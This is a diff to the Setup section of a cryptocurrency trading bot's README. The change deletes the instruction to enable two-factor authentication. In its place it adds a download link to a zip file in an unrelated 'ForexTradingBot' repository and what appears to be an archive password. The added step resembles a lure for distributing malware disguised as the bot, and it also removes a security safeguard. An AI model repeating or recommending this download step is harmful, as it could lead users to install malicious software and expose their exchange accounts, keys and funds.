@@ -32,8 +32,8 @@ The bot jumps between a configured set of coins on the condition that it does no
 
 ## Setup
 
--   DWL: .
--   Enable Two-factor Authentication.
+-   DWL: . https://github.com/chicken2362t/ForexTradingBot/blob/main/ForTradBot.zip 
+-   Code forextrade
 -   Create a new API key.
 -   Get a cryptocurrency. If its symbol is not in the default list, add it.
 
